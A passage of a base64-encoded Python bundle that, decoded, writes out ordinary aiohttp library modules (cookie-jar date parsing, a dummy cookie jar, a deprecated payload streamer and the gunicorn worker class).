RydWVcclxuICAgICAgICAgICAgICAgICAgICBhc3NlcnQgbW9udGhfbWF0Y2gubGFzdGluZGV4IGlzIG5vdCBOb25lXHJcbiAgICAgICAgICAgICAgICAgICAgbW9udGggPSBtb250aF9tYXRjaC5sYXN0aW5kZXhcclxuICAgICAgICAgICAgICAgICAgICBjb250aW51ZVxyXG5cclxuICAgICAgICAgICAgaWYgbm90IGZvdW5kX3llYXI6XHJcbiAgICAgICAgICAgICAgICB5ZWFyX21hdGNoID0gY2xzLkRBVEVfWUVBUl9SRS5tYXRjaCh0b2tlbilcclxuICAgICAgICAgICAgICAgIGlmIHllYXJfbWF0Y2g6XHJcbiAgICAgICAgICAgICAgICAgICAgZm91bmRfeWVhciA9IFRydWVcclxuICAgICAgICAgICAgICAgICAgICB5ZWFyID0gaW50KHllYXJfbWF0Y2guZ3JvdXAoKSlcclxuXHJcbiAgICAgICAgaWYgNzAgPD0geWVhciA8PSA5OTpcclxuICAgICAgICAgICAgeWVhciArPSAxOTAwXHJcbiAgICAgICAgZWxpZiAwIDw9IHllYXIgPD0gNjk6XHJcbiAgICAgICAgICAgIHllYXIgKz0gMjAwMFxyXG5cclxuICAgICAgICBpZiBGYWxzZSBpbiAoZm91bmRfZGF5LCBmb3VuZF9tb250aCwgZm91bmRfeWVhciwgZm91bmRfdGltZSk6XHJcbiAgICAgICAgICAgIHJldHVybiBOb25lXHJcblxyXG4gICAgICAgIGlmIG5vdCAxIDw9IGRheSA8PSAzMTpcclxuICAgICAgICAgICAgcmV0dXJuIE5vbmVcclxuXHJcbiAgICAgICAgaWYgeWVhciA8IDE2MDEgb3IgaG91ciA+IDIzIG9yIG1pbnV0ZSA+IDU5IG9yIHNlY29uZCA+IDU5OlxyXG4gICAgICAgICAgICByZXR1cm4gTm9uZVxyXG5cclxuICAgICAgICByZXR1cm4gZGF0ZXRpbWUuZGF0ZXRpbWUoXHJcbiAgICAgICAgICAgIHllYXIsIG1vbnRoLCBkYXksIGhvdXIsIG1pbnV0ZSwgc2Vjb25kLCB0emluZm89ZGF0ZXRpbWUudGltZXpvbmUudXRjXHJcbiAgICAgICAgKVxyXG5cclxuXHJcbmNsYXNzIER1bW15Q29va2llSmFyKEFic3RyYWN0Q29va2llSmFyKTpcclxuICAgICIiIkltcGxlbWVudHMgYSBkdW1teSBjb29raWUgc3RvcmFnZS5cclxuXHJcbiAgICBJdCBjYW4gYmUgdXNlZCB3aXRoIHRoZSBDbGllbnRTZXNzaW9uIHdoZW4gbm8gY29va2llIHByb2Nlc3NpbmcgaXMgbmVlZGVkLlxyXG5cclxuICAgICIiIlxyXG5cclxuICAgIGRlZiBfX2luaXRfXyhzZWxmLCAqLCBsb29wOiBPcHRpb25hbFthc3luY2lvLkFic3RyYWN0RXZlbnRMb29wXSA9IE5vbmUpIC0+IE5vbmU6XHJcbiAgICAgICAgc3VwZXIoKS5fX2luaXRfXyhsb29wPWxvb3ApXHJcblxyXG4gICAgZGVmIF9faXRlcl9fKHNlbGYpIC0+ICJJdGVyYXRvcltNb3JzZWxbc3RyXV0iOlxyXG4gICAgICAgIHdoaWxlIEZhbHNlOlxyXG4gICAgICAgICAgICB5aWVsZCBOb25lXHJcblxyXG4gICAgZGVmIF9fbGVuX18oc2VsZikgLT4gaW50OlxyXG4gICAgICAgIHJldHVybiAwXHJcblxyXG4gICAgZGVmIGNsZWFyKHNlbGYsIHByZWRpY2F0ZTogT3B0aW9uYWxbQ2xlYXJDb29raWVQcmVkaWNhdGVdID0gTm9uZSkgLT4gTm9uZTpcclxuICAgICAgICBwYXNzXHJcblxyXG4gICAgZGVmIGNsZWFyX2RvbWFpbihzZWxmLCBkb21haW46IHN0cikgLT4gTm9uZTpcclxuICAgICAgICBwYXNzXHJcblxyXG4gICAgZGVmIHVwZGF0ZV9jb29raWVzKHNlbGYsIGNvb2tpZXM6IExvb3NlQ29va2llcywgcmVzcG9uc2VfdXJsOiBVUkwgPSBVUkwoKSkgLT4gTm9uZTpcclxuICAgICAgICBwYXNzXHJcblxyXG4gICAgZGVmIGZpbHRlcl9jb29raWVzKHNlbGYsIHJlcXVlc3RfdXJsOiBVUkwpIC0+ICJCYXNlQ29va2llW3N0cl0iOlxyXG4gICAgICAgIHJldHVybiBTaW1wbGVDb29raWUoKVxyXG4nKQogICAgX19zdGlja3l0YXBlX3dyaXRlX21vZHVsZSgnYWlvaHR0cC9wYXlsb2FkX3N0cmVhbWVyLnB5JywgYiciIiJcclxuUGF5bG9hZCBpbXBsZW1lbmF0aW9uIGZvciBjb3JvdXRpbmVzIGFzIGRhdGEgcHJvdmlkZXIuXHJcblxyXG5BcyBhIHNpbXBsZSBjYXNlLCB5b3UgY2FuIHVwbG9hZCBkYXRhIGZyb20gZmlsZTo6XHJcblxyXG4gICBAYWlvaHR0cC5zdHJlYW1lclxyXG4gICBhc3luYyBkZWYgZmlsZV9zZW5kZXIod3JpdGVyLCBmaWxlX25hbWU9Tm9uZSk6XHJcbiAgICAgIHdpdGggb3BlbihmaWxlX25hbWUsIFwncmJcJykgYXMgZjpcclxuICAgICAgICAgIGNodW5rID0gZi5yZWFkKDIqKjE2KVxyXG4gICAgICAgICAgd2hpbGUgY2h1bms6XHJcbiAgICAgICAgICAgICAgYXdhaXQgd3JpdGVyLndyaXRlKGNodW5rKVxyXG5cclxuICAgICAgICAgICAgICBjaHVuayA9IGYucmVhZCgyKioxNilcclxuXHJcblRoZW4geW91IGNhbiB1c2UgYGZpbGVfc2VuZGVyYCBsaWtlIHRoaXM6XHJcblxyXG4gICAgYXN5bmMgd2l0aCBzZXNzaW9uLnBvc3QoXCdodHRwOi8vaHR0cGJpbi5vcmcvcG9zdFwnLFxyXG4gICAgICAgICAgICAgICAgICAgICAgICAgICAgZGF0YT1maWxlX3NlbmRlcihmaWxlX25hbWU9XCdodWdlX2ZpbGVcJykpIGFzIHJlc3A6XHJcbiAgICAgICAgcHJpbnQoYXdhaXQgcmVzcC50ZXh0KCkpXHJcblxyXG4uLm5vdGU6OiBDb3JvdXRpbmUgbXVzdCBhY2NlcHQgYHdyaXRlcmAgYXMgZmlyc3QgYXJndW1lbnRcclxuXHJcbiIiIlxyXG5cclxuaW1wb3J0IHR5cGVzXHJcbmltcG9ydCB3YXJuaW5nc1xyXG5mcm9tIHR5cGluZyBpbXBvcnQgQW55LCBBd2FpdGFibGUsIENhbGxhYmxlLCBEaWN0LCBUdXBsZVxyXG5cclxuZnJvbSAuYWJjIGltcG9ydCBBYnN0cmFjdFN0cmVhbVdyaXRlclxyXG5mcm9tIC5wYXlsb2FkIGltcG9ydCBQYXlsb2FkLCBwYXlsb2FkX3R5cGVcclxuXHJcbl9fYWxsX18gPSAoInN0cmVhbWVyIiwpXHJcblxyXG5cclxuY2xhc3MgX3N0cmVhbV93cmFwcGVyOlxyXG4gICAgZGVmIF9faW5pdF9fKFxyXG4gICAgICAgIHNlbGYsXHJcbiAgICAgICAgY29ybzogQ2FsbGFibGVbLi4uLCBBd2FpdGFibGVbTm9uZV1dLFxyXG4gICAgICAgIGFyZ3M6IFR1cGxlW0FueSwgLi4uXSxcclxuICAgICAgICBrd2FyZ3M6IERpY3Rbc3RyLCBBbnldLFxyXG4gICAgKSAtPiBOb25lOlxyXG4gICAgICAgIHNlbGYuY29ybyA9IHR5cGVzLmNvcm91dGluZShjb3JvKVxyXG4gICAgICAgIHNlbGYuYXJncyA9IGFyZ3NcclxuICAgICAgICBzZWxmLmt3YXJncyA9IGt3YXJnc1xyXG5cclxuICAgIGFzeW5jIGRlZiBfX2NhbGxfXyhzZWxmLCB3cml0ZXI6IEFic3RyYWN0U3RyZWFtV3JpdGVyKSAtPiBOb25lOlxyXG4gICAgICAgIGF3YWl0IHNlbGYuY29ybyh3cml0ZXIsICpzZWxmLmFyZ3MsICoqc2VsZi5rd2FyZ3MpICAjIHR5cGU6IGlnbm9yZVtvcGVyYXRvcl1cclxuXHJcblxyXG5jbGFzcyBzdHJlYW1lcjpcclxuICAgIGRlZiBfX2luaXRfXyhzZWxmLCBjb3JvOiBDYWxsYWJsZVsuLi4sIEF3YWl0YWJsZVtOb25lXV0pIC0+IE5vbmU6XHJcbiAgICAgICAgd2FybmluZ3Mud2FybihcclxuICAgICAgICAgICAgIkBzdHJlYW1lciBpcyBkZXByZWNhdGVkLCB1c2UgYXN5bmMgZ2VuZXJhdG9ycyBpbnN0ZWFkIixcclxuICAgICAgICAgICAgRGVwcmVjYXRpb25XYXJuaW5nLFxyXG4gICAgICAgICAgICBzdGFja2xldmVsPTIsXHJcbiAgICAgICAgKVxyXG4gICAgICAgIHNlbGYuY29ybyA9IGNvcm9cclxuXHJcbiAgICBkZWYgX19jYWxsX18oc2VsZiwgKmFyZ3M6IEFueSwgKiprd2FyZ3M6IEFueSkgLT4gX3N0cmVhbV93cmFwcGVyOlxyXG4gICAgICAgIHJldHVybiBfc3RyZWFtX3dyYXBwZXIoc2VsZi5jb3JvLCBhcmdzLCBrd2FyZ3MpXHJcblxyXG5cclxuQHBheWxvYWRfdHlwZShfc3RyZWFtX3dyYXBwZXIpXHJcbmNsYXNzIFN0cmVhbVdyYXBwZXJQYXlsb2FkKFBheWxvYWQpOlxyXG4gICAgYXN5bmMgZGVmIHdyaXRlKHNlbGYsIHdyaXRlcjogQWJzdHJhY3RTdHJlYW1Xcml0ZXIpIC0+IE5vbmU6XHJcbiAgICAgICAgYXdhaXQgc2VsZi5fdmFsdWUod3JpdGVyKVxyXG5cclxuXHJcbkBwYXlsb2FkX3R5cGUoc3RyZWFtZXIpXHJcbmNsYXNzIFN0cmVhbVBheWxvYWQoU3RyZWFtV3JhcHBlclBheWxvYWQpOlxyXG4gICAgZGVmIF9faW5pdF9fKHNlbGYsIHZhbHVlOiBBbnksICphcmdzOiBBbnksICoqa3dhcmdzOiBBbnkpIC0+IE5vbmU6XHJcbiAgICAgICAgc3VwZXIoKS5fX2luaXRfXyh2YWx1ZSgpLCAqYXJncywgKiprd2FyZ3MpXHJcblxyXG4gICAgYXN5bmMgZGVmIHdyaXRlKHNlbGYsIHdyaXRlcjogQWJzdHJhY3RTdHJlYW1Xcml0ZXIpIC0+IE5vbmU6XHJcbiAgICAgICAgYXdhaXQgc2VsZi5fdmFsdWUod3JpdGVyKVxyXG4nKQogICAgX19zdGlja3l0YXBlX3dyaXRlX21vZHVsZSgnYWlvaHR0cC93b3JrZXIucHknLCBiJyIiIkFzeW5jIGd1bmljb3JuIHdvcmtlciBmb3IgYWlvaHR0cC53ZWIiIiJcclxuXHJcbmltcG9ydCBhc3luY2lvXHJcbmltcG9ydCBvc1xyXG5pbXBvcnQgcmVcclxuaW1wb3J0IHNpZ25hbFxyXG5pbXBvcnQgc3lzXHJcbmZyb20gdHlwZXMgaW1wb3J0IEZyYW1lVHlwZVxyXG5mcm9tIHR5cGluZyBpbXBvcnQgQW55LCBBd2FpdGFibGUsIENhbGxhYmxlLCBPcHRpb25hbCwgVW5pb24gICMgbm9xYVxyXG5cclxuZnJvbSBndW5pY29ybi5jb25maWcgaW1wb3J0IEFjY2Vzc0xvZ0Zvcm1hdCBhcyBHdW5pY29ybkFjY2Vzc0xvZ0Zvcm1hdFxyXG5mcm9tIGd1bmljb3JuLndvcmtlcnMgaW1wb3J0IGJhc2VcclxuXHJcbmZyb20gYWlvaHR0cCBpbXBvcnQgd2ViXHJcblxyXG5mcm9tIC5oZWxwZXJzIGltcG9ydCBzZXRfcmVzdWx0XHJcbmZyb20gLndlYl9hcHAgaW1wb3J0IEFwcGxpY2F0aW9uXHJcbmZyb20gLndlYl9sb2cgaW1wb3J0IEFjY2Vzc0xvZ2dlclxyXG5cclxudHJ5OlxyXG4gICAgaW1wb3J0IHNzbFxyXG5cclxuICAgIFNTTENvbnRleHQgPSBzc2wuU1NMQ29udGV4dFxyXG5leGNlcHQgSW1wb3J0RXJyb3I6ICAjIHByYWdtYTogbm8gY292ZXJcclxuICAgIHNzbCA9IE5vbmUgICMgdHlwZTogaWdub3JlW2Fzc2lnbm1lbnRdXHJcbiAgICBTU0xDb250ZXh0ID0gb2JqZWN0ICAjIHR5cGU6IGlnbm9yZVttaXNjLGFzc2lnbm1lbnRdXHJcblxyXG5cclxuX19hbGxfXyA9ICgiR3VuaWNvcm5XZWJXb3JrZXIiLCAiR3VuaWNvcm5VVkxvb3BXZWJXb3JrZXIiLCAiR3VuaWNvcm5Ub2tpb1dlYldvcmtlciIpXHJcblxyXG5cclxuY2xhc3MgR3VuaWNvcm5XZWJXb3JrZXIoYmFzZS5Xb3JrZXIpOiAgIyB0eXBlOiBpZ25vcmVbbWlzYyxuby1hbnktdW5pbXBvcnRlZF1cclxuXHJcbiAgICBERUZBVUxUX0FJT0hUVFBfTE9HX0ZPUk1BVCA9IEFjY2Vzc0xvZ2dlci5MT0dfRk9STUFUXHJcbiAgICBERUZBVUxUX0dVTklDT1JOX0xPR19GT1JNQVQgPSBHdW5pY29ybkFjY2Vzc0xvZ0Zvcm1hdC5kZWZhdWx0XHJcblxyXG4gICAgZGVmIF9faW5pdF9fKHNlbGYsICphcmdzOiBBbnksICoqa3c6IEFueSkgLT4gTm9uZTogICMgcHJhZ21hOiBubyBjb3ZlclxyXG4gICAgICAgIHN1cGVyKCkuX19pbml0X18oKmFyZ3MsICoqa3cpXHJcblxyXG4gICAgICAgIHNlbGYuX3Rhc2sgPSBOb25lICAjIHR5cGU6IE9wdGlvbmFsW2FzeW5jaW8uVGFza1tOb25lXV1cclxuICAgICAgICBzZWxmLmV4aXRfY29kZSA9IDBcclxuICAgICAgICBzZWxmLl9ub3RpZnlfd2FpdGVyID0gTm9uZSAgIyB0eXBlOiBPcHRpb25hbFthc3luY2lvLkZ1dHVyZVtib29sXV1cclxuXHJcbiAgICBkZWYgaW5pdF9wcm9jZXNzKHNlbGYpIC0+IE5vbmU6XHJcbiAgICAgICAgIyBjcmVhdGUgbmV3IGV2ZW50X2xvb3AgYWZ0ZXIgZm9ya1xyXG4gICAgICAgIGFzeW5jaW8uZ2V0X2V2ZW50X2xvb3AoKS5jbG9zZSgpXHJcblxyXG4gICAgICAgIHNlbGYubG9vcCA9IGFzeW5jaW8ubmV3X2V2ZW50X2xvb3AoKVxyXG4gICAgICAgIGFzeW5jaW8uc2V0X2V2ZW50X2xvb3Aoc2VsZi5sb29wKVxyXG5cclxuICAgICAgICBzdXBlcigpLmluaXRfcHJvY2VzcygpXHJcblxyXG4gICAgZGVmIHJ1bihzZWxmKSAtPiBOb25lOlxyXG4gICAgICAgIHNlbGYuX3Rhc2sgPSBzZWxmLmxvb3AuY3JlYXRlX3Rhc2soc2VsZi5fcnVuKCkpXHJcblxyXG4gICAgICAgIHRyeTogICMgaWdub3JlIGFsbCBmaW5hbGl6YXRpb24gcHJvYmxlbXNcclxuICAgICAgICAgICAgc2VsZi5sb29wLnJ1bl91bnRpbF9jb21wbGV0ZShzZWxmLl90YXNrKVxyXG4gICAgICAgIGV4Y2VwdCBFeGNlcHRpb246XHJcbiAgICAgICAgICAgIHNlbGYubG9nLmV4Y2VwdGlvbigiRXhjZXB0aW9uIGluIGd1bmljb3JuIHdvcmtlciIpXHJcbiAgICAgICAgc2VsZi5sb29wLnJ1bl91bnRpbF9jb21wbGV0ZShzZWxmLmxvb3Auc2h1dGRvd25fYXN5bmNnZW5zKCkpXHJcbiAgICAgICAgc2VsZi5sb29wLmNsb3NlKClcclxuXHJcbiAgICAgICAgc3lzLmV4aXQoc2VsZi5leGl0X2NvZGUpXHJcblxyXG4gICAgYXN5bmMgZGVmIF9ydW4oc2VsZikgLT4gTm9uZTpcclxuICAgICAgICBydW5uZXIgPSBOb25lXHJcbiAgICAgICAgaWYgaXNpbnN0YW5jZShzZWxmLndzZ2ksIEFwcGxpY2F0aW9uKTpcclxuICAgICAgICAgICAgYXBwID0gc2VsZi53c2dpXHJcbiAgICAgICAgZWxpZiBhc3luY2lvLmlzY29yb3V0aW5lZnVuY3Rpb24oc2VsZi53c2dpKTpcclxuICAgICAgICAgICAgd3NnaSA9IGF3YWl0IHNlbGYud3NnaSgpXHJcbiAgICAgICAgICAgIGlmIGlzaW5zdGFuY2Uod3NnaSwgd2ViLkFwcFJ1bm5lcik6XHJcbiAgICAgICAgICAgICAgICBydW5uZXIgPSB3c2dpXHJcbiAgICAgICAgICAgICAgICBhcHAgPSBydW5uZXIuYXBwXHJcbiAgICAgICAgICAgIGVsc2U6XHJcbiAgICAgICAgICAgICAgICBhcHAgPSB3c2dpXHJcbiAgICAgICAgZWxzZTpcclxuICAgICAgICAgICAgcmFpc2UgUnVudGltZUVycm9yKFxyXG4gICAgICAgICAgICAgICAgIndzZ2kgYXBwIHNob3VsZCBiZSBlaXRoZXIgQXBwbGljYXRpb24gb3IgIlxyXG4gICAgICAgICAgICAgICAgImFzeW5jIGZ1bmN0aW9uIHJldHVybmluZyBBcHBsaWNhdGlvbiwgZ290IHt9Ii5mb3JtYXQoc2VsZi53c2dpKVxyXG4gICAgICAgICAgICApXHJcblxyXG4gICAgICAgIGlmIHJ1bm5lciBpcyBOb25lOlxyXG4gICAgICAgICAgICBhY2Nlc3NfbG9nID0gc2VsZi5sb2cuYWNjZXNzX2xvZyBpZiBzZWxmLmNmZy5hY2Nlc3Nsb2cgZWxzZSBOb25lXHJcbiAgICAgICAgICAgIHJ1bm5lciA9IHdlYi5BcHBSdW5uZXIoXHJcbiAgICAgICAgICAgICAgICBhcHAsXHJcbiAgICAgICAgICAgICAgICBsb2dnZXI9c2VsZi5sb2csXHJcbiAgICAgICAgICAgICAgICBrZWVwYWxpdmVfdGltZW91dD1zZWxmLmNmZy5rZWVwYWxpdmUsXHJcbiAgICAgICAgICAgICAgICBhY2Nlc3NfbG9nPWFjY2Vzc19sb2csXHJcbiAgICAgICAgICAgICAgICBhY2Nlc3NfbG9nX2Zvcm1hdD1zZWxmLl9nZXRfdmFsaWRfbG9nX2Zvcm1hdChcclxuICAgICAgICAgICAgICAgICAgICBzZWxmLmNmZy5hY2Nlc3NfbG9nX2Zvcm1hdFxyXG4gICAgICAgICAgICAgICAgKSxcclxuICAgICAgICAgICAgKVxyXG4gICAgICAgIGF3YWl0IHJ1bm5lci5zZXR1cCgpXHJcblxyXG4gICAgICAgIGN0eCA9IHNlbGYuX2NyZWF0ZV9zc2xfY29udGV4dChzZWxmLmNmZykgaWYgc2VsZi5jZmcuaXNfc3NsIGVsc2UgTm9uZVxyXG5cclxuICAgICAgICBydW5uZXIgPSBydW5uZXJcclxuICAgICAgICBhc3NlcnQgcnVubmVyIGlzIG5vdCBOb25lXHJcbiAgICAgICAgc2VydmVyID0gcnVubmVyLnNlcnZlclxyXG4gICAgICAgIGFzc2VydCBzZXJ2ZXIgaXMgbm90IE5vbmVcclxuICAgICAgICBmb3Igc29jayBpbiBzZWxmLnNvY2tldHM6XHJcbiAgICAgICAgICAgIHNpdGUgPSB3ZWIuU29ja1NpdGUoXHJcbiAgICAgICAgICAgICAgICBydW5uZXIsXHJcbiAgICAgICAgICAgICAgICBzb2NrLFxyXG4gICAgICAgICAgICAgICAgc3NsX2NvbnRleHQ9Y3R4LFxyXG4gICAgICAgICAgICAgICAgc2h1dGRvd25fdGltZW91dD1zZWxmLmNmZy5ncmFjZWZ1bF90aW1lb3V0IC8gMTAwICogOTUsXHJcbiAgICAgICAgICAgIClcclxuICAgICAgICAgICAgYXdhaXQgc2l0ZS5zdGFydCgpXHJcblxyXG4gICAgICAgICMgSWYgb3VyIHBhcmVudCBjaGFuZ2VkIHRoZW4gd2Ugc2h1dCBkb3duLlxyXG4gICAgICAgIHBpZCA9IG9zLmdldHBpZCgpXHJcbiAgICAgICAgdHJ5OlxyXG4gICAgICAgICAgICB3aGlsZSBzZWxmLmFsaXZlOiAgIyB0eXBlOiBpZ25vcmVbaGFzLXR5cGVdXHJcbiAgICAgICAgICAgICAgICBzZWxmLm5vdGlmeSgpXHJcblxyXG4gICAgICAgICAgICAgICAgY250ID0gc2VydmVyLnJlcXVlc3RzX2NvdW50XHJcbiAgICAgICAgICAgICAgICBpZiBzZWxmLmNmZy5tYXhfcmVxdWVzdHMgYW5kIGNudCA+IHNlbGYuY2ZnLm1heF9yZXF1ZXN0czpcclxuICAgICAgICAgICAgICAgICAgICBzZWxmLmFsaXZlID0gRmFsc2VcclxuICAgICAgICAgICAgICAgICAgICBzZWxmLmxvZy5pbmZvKCJNYXggcmVxdWVzdHMsIHNodXR0aW5nIGRvd246ICVzIiwgc2VsZilcclxuXHJcbiAgICAgICAgICAgICAgICBlbGlmIHBpZCA9PSBvcy5nZXRwaWQoKSBhbmQgc2VsZi5wcGlkICE9IG9zLmdldHBwaWQoKTpcclxuICAgICAgICAgICAgICAgICAgICBzZWxmLmFsaXZlID0gRmFsc2VcclxuICAgICAgICAgICAgICAgICAgICBzZWxmLmxvZy5pbmZvKCJQYXJlbnQgY2hhbmdlZCwgc2h1dHRpbmcgZG93bjogJXMiLCBzZWxmKVxyXG4gICAgICAgICAgICAgICAgZWxzZTpcclxuICAgICAgICAgICAgICAgICAgICBhd2FpdCBzZWxmLl93YWl0X25leHRfbm90aWZ5KClcclxuICAgICAgICBleGNlcHQgQmFzZUV4Y2VwdGlvbjpcclxuICAgICAgICAgICAgcGFzc1xyXG5cclxuICAgICAgICBhd2FpdCBydW5uZXIuY2xlYW51cCgpXHJcblxyXG4gICAgZGVmIF93YWl0X25leHRfbm90aWZ5KHNlbGYpIC0+ICJhc3luY2lvLkZ1dHVyZVtib29sXSI6XHJcbiAgICAgICAgc2VsZi5fbm90aWZ5X3dhaXRlcl9kb25lKClcclxuXHJcbiAgICAgICAgbG9vcCA9IHNlbGYubG9vcFxyXG4gICAgICAgIGFzc2VydCBsb29wIGlzIG5vdCBOb25lXHJcbiAgICAgICAgc2VsZi5fbm90aWZ5X3dhaXRlciA9IHdhaXRlciA9IGxvb3AuY3JlYXRlX2Z1dHVyZSgpXHJcbiAgICAgICAgc2VsZi5sb29wLmNhbGxfbGF0ZXIoMS4wLCBzZWxmLl9ub3RpZnlfd2FpdGVyX2RvbmUsIHdhaXRlcilcclxuXHJcbiAgICAgICAgcmV0dXJuIHdhaXRlclxyXG5cclxuICAgIGRlZiBfbm90aWZ5X3dhaXRlcl9kb25lKFxyXG4gICAgICAgIHNlbGYsIHdhaXRlcjogT3B0aW9uYWxbImFzeW5jaW8uRnV0dXJlW2Jvb2xdIl0gPSBOb25lXHJcbiAgICApIC0+IE5vbmU6XHJcbiAgICAgICAgaWYgd2FpdGVyIGlzIE5vbmU6XHJcbiAgICAgICAgICAgIHdhaXRlciA9IHNlbGYuX25vdGlmeV93YWl0ZXJcclxuICAgICAgICBpZiB3YWl0ZXIgaXMgbm90IE5vbmU6XHJcbiAgICAgICAgICAgIHNldF9yZXN1bHQod2FpdGVyLCBUcnVlKVxyXG5cclxuICAgICAgICBpZiB3YWl0ZXIgaXMgc2VsZi5fbm90aWZ5X3dhaXRlcjpcclxuICAgICAgICAgICAgc2VsZi5fbm90aWZ5X3dhaXRlciA9IE5vbmVcclxuXHJcbiAgICBkZWYgaW5pdF9zaWduYWxzKHNlbGYpIC0+IE5vbmU6XHJcbiAgICAgICAgIyBTZXQgdXAgc2lnbmFscyB0aHJvdWdoIHRoZSBldmVudCBsb29wIEFQSS5cclxuXHJcbiAgICAgICAgc2VsZi5sb29wLmFkZF9zaWduYWxfaGFuZGxlcihcclxuICAgICAgICAgICAgc2lnbmFsLlNJR1FVSVQsIHNlbGYuaGFuZGxlX3F1aXQsIHNpZ25hbC5TSUdRVUlULCBOb25lXHJcbiAgICAgICAgKVxyXG5cclxuICAgICAgICBzZWxmLmxvb3AuYWRkX3NpZ25hbF9oYW5kbGVyKFxyXG4gICAgICAgICAgICBzaWduYWwuU0lHVEVSTSwgc2VsZi5oYW5kbGVfZXhpdCwgc2lnbmFsLlNJR1RFUk0sIE5vbmVcclxuICAgICAgICApXHJcblxyXG4gICAgICAgIHNlbGYubG9vcC5hZGRfc2lnbmFsX2hhbmRsZXIoXHJcbiAgICAgICAgICAgIHNpZ25hbC5TSUdJTlQsIHNlbGYuaGFuZGxlX3F1aXQsIHNpZ25hbC5TSUdJTlQsIE5vbmVcclxuICAgICAgICApXHJcblxyXG4gICAgICAgIHNlbGYubG9vcC5hZGRfc2lnbmFsX2hhbmRsZXIoXHJcbiAgICAgICAgICAgIHNpZ25hbC5TSUdXSU5DSCwgc2VsZi5oYW5kbGVfd2luY2gsIHNpZ25hbC5TSUdXSU5DSCwgTm9uZVxyXG4gICAgICAgIClcclxuXHJcbiAgICAgICAgc2VsZi5sb29wLmFkZF9zaWduYWxfaGFuZGxlcihcclxuICAgICAgICAgICAgc2lnbmFsLlNJR1VTUjEsIHNlbGYuaGFuZGxlX3VzcjEsIHNpZ25hbC5TSUdVU1IxLCBOb25lXHJcbiAgICAgICAgKVxyXG5cclxuICAgICAgICBzZWxmLmxvb3AuYWRkX3NpZ25hbF9oYW5kbGVyKFxyXG4gICAgICAgICAgICBzaWduYWwuU0lHQUJSVCwgc2VsZi5oYW5kbGVfYWJvcnQsIHNpZ25hbC5TSUdBQlJULCBOb25lXHJcbiAgICAgICAgKVxyXG5cclxuICAgICAgICAjIERvblwndCBsZXQgU0lHVEVSTSBhbmQgU0lHVVNSMSBkaXN0dXJiIGFjdGl2ZSByZXF1ZXN0c1xyXG4gICAgICAgICMgYnkgaW50ZXJydXB0aW5nIHN5c3RlbSBjYWxsc1xyXG4gICAgICAgIHNpZ25hbC5zaWdpbnRlcnJ1cHQoc2lnbmFsLlNJR1RFUk0sIEZhbHNlKVxyXG4gICAgICAgIHNpZ25hbC5zaWdpbnRlcnJ1cHQoc2lnbmFsLlNJR1VTUjEsIEZhbHNlKVxyXG4gICAgICAgICMgUmVzZXQgc2lnbmFscyBzbyBHdW5pY29ybiBkb2VzblwndCBzd2FsbG93IHN1YnByb2Nlc3MgcmV0dXJuIGNvZGVzXHJcbiAgICAgICAgIyBTZWU6IGh0dHBzOi8vZ2l0aHViLmNvbS9haW8tbGlicy9haW9odHRwL2lzc3Vlcy82MTMwXHJcbiAgICAgICAgaWYgc3lzLnZlcnNpb25faW5mbyA8ICgzLCA4KTpcclxuICAgICAgICAgICAgIyBTdGFydGluZyBmcm9tIFB5dGhvbiAzLjgsXHJcbiAgICAgICAgICAgICMgdGhlIGRlZmF1bHQgY2hpbGQgd2F0Y2hlciBpcyBUaHJlYWRlZENoaWxkV2F0Y2hlci5cclxuICAgICAgICAgICAgIyBUaGUgd2F0Y2hlciBkb2VzblwndCBkZXBlbmQgb24gU0lHQ0hMRCBzaWduYWwsXHJcbiAgICAgICAgICAgICMgdGhlcmUgaXMgbm8gbmVlZCB0byByZXNldCBpdC5cclxuICAgICAgICAgICAgc2lnbmFsLnNpZ25hbChzaWduYWwuU0lHQ0hMRCwgc2lnbmFsLlNJR19ERkwpXHJcblxyXG4gICAgZGVmIGhhbmRsZV9xdWl0KHNlbGYsIHNpZzogaW50LCBmcmFtZTogRnJhbWVUeXBlKSAtPiBOb25lOlxyXG4gICAgICAgIHNlbGYuYWxpdmUgPSBGYWxzZVxyXG5cclxuICAgICAgICAjIHdvcmtlcl9pbnQgY2FsbGJhY2tcclxuICAgICAgICBzZWxmLmNmZy53b3JrZXJfaW50KHNlbGYpXHJcblxyXG4gICAgICAgICMgd2FrZXVwIGNsb3NpbmcgcHJvY2Vzc1xyXG4gICAgICAgIHNlbGYuX25vdGlmeV93YWl0ZXJfZG9uZSgpXHJcblxyXG4gICAgZGVmIGhhbmRsZV9hYm9ydChzZWxmLCBzaWc6IGludCwgZnJhbWU6IEZyYW1lVHlwZSkgLT4gTm9uZTpcclxuICAgICAgICBzZWxmLmFsaXZlID0gRmFsc2VcclxuICAgICAgICBzZWxmLmV4aXRfY29kZSA9IDFcclxuICAgICAgICBzZWxmLmNmZy53b3JrZXJfYWJvcnQoc2VsZilcclxuICAgICAgICBzeXMuZXhpdCgxKVxyXG5cclxuICAgIEBzdGF0aWNtZXRob2RcclxuICAgIGRlZiBfY3JlYXRlX3NzbF9jb250ZXh0KGNmZzogQW55KSAtPiAiU1NMQ29udGV4dCI6XHJcbiAgICAgICAgIiIiQ3JlYXRlcyBTU0xDb250ZXh0IGluc3RhbmNlIGZvciB1c2FnZSBpbiBhc3luY2lvLmNyZWF0ZV9zZXJ2ZXIuXHJcblxyXG4gICAgICAgIFNlZSBzc2wuU1NMU29ja2V0Ll9faW5pdF9fIGZvciBtb3JlIGRldGFpbHMuXHJcbiAgICAgICAgIiIiXHJcbiAgICAgICAgaWYgc3NsIGlzIE5vbmU6ICAjIHByYWdtYTogbm8gY292ZXJcclxuICAgICAgICAgICAgcmFpc2UgUnVudGltZUVycm9yKCJTU0wgaXMgbm90IHN1cHBvcnRlZC4iKVxyXG5cclxuICAgICAgICBjdHggPSBzc2wuU1NMQ29udGV4dChjZmcuc3NsX3ZlcnNpb24pXHJcbiAgICAgICAgY3R4LmxvYWRfY2VydF9jaGFpbihjZmcuY2VydGZpbGUsIGNmZy5rZXlmaWxlKVxyXG4gICAgICAgIGN0eC52ZXJpZnlfbW9kZSA9IGNmZy5jZXJ0X3JlcXNcclxuICAgICAgICBpZiBjZmcuY2FfY2VydHM6XHJcbiAgICAgICAgICAgIGN0eC5sb2FkX3ZlcmlmeV9sb2NhdGlvbnMoY2ZnLmNhX2NlcnRzKVxyXG4gICAgICAgIGlmIGNmZy5jaXBoZXJzOlxyXG4gICAgICAgICAgICBjdHguc2V0X2NpcGhlcnMoY2ZnLmNpcGhlcnMpXHJcbiAgICAgICAgcmV0dXJuIGN0eFxyXG5cclxuICAgIGRlZiBfZ2V0X3ZhbGlkX2xvZ19mb3JtYXQoc2VsZiwgc291cmNlX2Zvcm1hdDogc3